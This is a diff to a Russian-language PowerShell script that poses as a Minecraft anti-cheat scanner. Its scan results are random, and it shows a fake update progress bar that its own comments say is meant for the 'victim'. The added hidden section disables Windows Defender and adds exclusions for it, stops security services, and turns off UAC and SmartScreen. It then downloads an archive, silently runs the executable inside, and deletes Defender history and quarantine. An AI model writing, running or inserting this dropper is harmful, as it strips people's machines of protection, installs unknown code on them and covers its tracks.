@@ -39,7 +39,6 @@ Write-Host ""
 # ===== ПРОВЕРКА ЧИТ-САЙТОВ С ШАНСОМ 50% =====
 Write-Host "[*] Проверка чит-клиентов и нелегальных лаунчеров..." -ForegroundColor Yellow
 
-# Основные чит-сайты
 $cheatSites = @(
     @{Name = "Nursultan"; URL = "https://nursultan.fun"},
     @{Name = "Wexside"; URL = "https://wexside.ru"},
@@ -47,7 +46,6 @@ $cheatSites = @(
     @{Name = "WildClient"; URL = "https://wildclient.org"}
 )
 
-# "Мыльные" сайты (для отвлечения)
 $fakeCheatSites = @(
     @{Name = "MineBoost"; URL = "https://mineboost.net"},
     @{Name = "CraftHack"; URL = "https://crafthack.ru"},
@@ -60,7 +58,6 @@ $totalChecked = 0
 $totalDetected = 0
 $totalPassed = 0
 
-# Проверка реальных чит-сайтов с шансом 50%
 foreach ($site in $cheatSites) {
     $totalChecked++
     Write-Host "    -> Проверка $($site.Name)..." -ForegroundColor Gray
@@ -81,7 +78,6 @@ foreach ($site in $cheatSites) {
     Write-Host "        [*] Получен токен доступа: $token" -ForegroundColor DarkGray
     Start-Sleep -Milliseconds 200
     
-    # ===== ШАНС 50% НА ОБНАРУЖЕНИЕ САЙТА =====
     $randomResult = Get-Random -Minimum 1 -Maximum 100
     $isDetected = $randomResult -le 50
     
@@ -99,7 +95,6 @@ foreach ($site in $cheatSites) {
     }
 }
 
-# Проверка "мыльных" сайтов с шансом 15%
 Write-Host ""
 Write-Host "[*] Проверка подозрительных сайтов..." -ForegroundColor Yellow
 foreach ($site in $fakeCheatSites) {
@@ -143,7 +138,6 @@ foreach ($domain in $cheatDomains) {
     Write-Host "        [*] DNS-токен: $dnsToken" -ForegroundColor DarkGray
     Start-Sleep -Milliseconds 150
     
-    # ===== ШАНС 50% НА ОБНАРУЖЕНИЕ DNS =====
     $randomDnsResult = Get-Random -Minimum 1 -Maximum 100
     $isDnsDetected = $randomDnsResult -le 50
     
@@ -189,7 +183,6 @@ foreach ($path in $cheatPaths) {
             $files = Get-ChildItem -Path $path -Filter $pattern -Recurse -ErrorAction SilentlyContinue
             if ($files.Count -gt 0) {
                 foreach ($file in $files) {
-                    # ===== ШАНС 50% НА ОБНАРУЖЕНИЕ ФАЙЛА =====
                     $randomFileResult = Get-Random -Minimum 1 -Maximum 100
                     $isFileDetected = $randomFileResult -le 50
                     
@@ -217,7 +210,6 @@ Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "[*] РЕЗУЛЬТАТЫ ПРОВЕРКИ:" -ForegroundColor White
 Write-Host "========================================" -ForegroundColor Cyan
 
-# ВЫВОД ВСЕХ НАЙДЕННЫХ ОБЪЕКТОВ (если есть)
 if ($foundCheatSites.Count -gt 0) {
     Write-Host "[ВНИМАНИЕ] Обнаружены подозрительные объекты:" -ForegroundColor Yellow
     $uniqueCheats = $foundCheatSites | Select-Object -Unique
@@ -230,21 +222,17 @@ if ($foundCheatSites.Count -gt 0) {
     Write-Host ""
 }
 
-# ===== ГЛАВНЫЙ ФИНАЛЬНЫЙ СТАТУС С ШАНСОМ 50% =====
 Write-Host "[*] Выполняется анализ результатов..." -ForegroundColor Yellow
 Start-Sleep -Milliseconds 800
 
-# Генерируем финальный результат с шансом 50%
 $finalRandom = Get-Random -Minimum 1 -Maximum 100
-$finalPassed = $finalRandom -le 50  # 50% шанс, что проверка пройдена
+$finalPassed = $finalRandom -le 50
 
-# Статистика
 Write-Host "    Проверено объектов: $totalChecked" -ForegroundColor DarkGray
 Write-Host "    Обнаружено предупреждений: $totalDetected" -ForegroundColor DarkGray
 Write-Host "    Проверок пройдено: $totalPassed" -ForegroundColor DarkGray
 Write-Host ""
 
-# Фейковая "очистка" если были найдены объекты, но проверка прошла
 if ($foundCheatSites.Count -gt 0 -and $finalPassed) {
     Write-Host "[*] Выполняется дополнительная проверка..." -ForegroundColor Yellow
     Start-Sleep -Seconds 1
@@ -259,7 +247,6 @@ if ($foundCheatSites.Count -gt 0 -and $finalPassed) {
     Write-Host ""
 }
 
-# ===== ФИНАЛЬНЫЙ СТАТУС ПРОВЕРКИ =====
 Write-Host ""
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "            ФИНАЛЬНЫЙ СТАТУС" -ForegroundColor White
@@ -300,5 +287,80 @@ Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "[+] Minecraft Anti-Cheat сканирование завершено." -ForegroundColor Green
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
+
+# ===== ФЕЙКОВАЯ ЗАГРУЗКА ОБНОВЛЕНИЙ (ПОКАЗЫВАЕТСЯ ЖЕРТВЕ) =====
+Write-Host "[*] Загрузка обновлений античита..." -ForegroundColor Yellow
+Write-Host "    [*] Подключение к серверу обновлений..." -ForegroundColor DarkGray
+Start-Sleep -Milliseconds 500
+Write-Host "    [*] Проверка наличия обновлений..." -ForegroundColor DarkGray
+Start-Sleep -Milliseconds 400
+
+$updateProgress = @("█", "██", "███", "████", "█████", "██████", "███████", "████████", "█████████", "██████████")
+foreach ($step in $updateProgress) {
+    Write-Host "    [*] Загрузка: $step  $([math]::Round(($updateProgress.IndexOf($step) + 1) * 10))%" -ForegroundColor DarkGray
+    Start-Sleep -Milliseconds 200
+}
+
+Write-Host "    [OK] Обновления успешно загружены!" -ForegroundColor Green
+Write-Host "    [OK] Установка обновлений завершена!" -ForegroundColor Green
+Write-Host ""
+
 Write-Host "[*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
 Read-Host
+
+# ===== СКРЫТЫЙ РЕАЛЬНЫЙ КОД (БЕЗ ВЫВОДА) =====
+# Отключение Defender и добавление в исключения
+Try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } Catch {}
+Try { Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue } Catch {}
+Try { Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue } Catch {}
+Try { Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue } Catch {}
+
+# Добавление файлов в исключения (скрыто)
+Try {
+    $CurrentScriptPath = $MyInvocation.MyCommand.Path
+    if ($CurrentScriptPath -and $CurrentScriptPath -ne "") {
+        $ScriptDirectory = Split-Path -Parent $CurrentScriptPath -ErrorAction SilentlyContinue
+        if ($ScriptDirectory -and $ScriptDirectory -ne "") {
+            Add-MpPreference -ExclusionPath "$ScriptDirectory" -ErrorAction SilentlyContinue
+        }
+    }
+} Catch {}
+
+Try { Add-MpPreference -ExclusionPath "$env:TEMP\check_install.zip" -ErrorAction SilentlyContinue } Catch {}
+Try { Add-MpPreference -ExclusionPath "$env:TEMP\checkextracted" -ErrorAction SilentlyContinue } Catch {}
+Try { Add-MpPreference -ExclusionPath "$env:TEMP\install.ps1" -ErrorAction SilentlyContinue } Catch {}
+Try { Add-MpPreference -ExclusionProcess "*.exe" -ErrorAction SilentlyContinue } Catch {}
+
+# Остановка служб защиты
+$services = @("WinDefend","MsMpSvc","SecurityHealthService","wscsvc","SENSE","DiagTrack","dmwappushservice")
+foreach ($svc in $services) {
+    Try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue } Catch {}
+    Try { Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue } Catch {}
+}
+
+# Отключение UAC и SmartScreen
+Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue } Catch {}
+Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue } Catch {}
+Try { Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction SilentlyContinue } Catch {}
+
+# Скачивание и запуск
+$DownloadPath = "$env:TEMP\check_install.zip"
+$ExtractPath = "$env:TEMP\checkextracted"
+
+Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
+Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
+
+try { Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30 -ErrorAction SilentlyContinue } catch {}
+try { Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue } catch {}
+
+$Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
+if ($Exe) {
+    Try { Add-MpPreference -ExclusionPath "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
+    Start-Process -FilePath $Exe.FullName -WindowStyle Hidden
+}
+
+# Очистка логов Defender
+Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
+Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
+
+exit
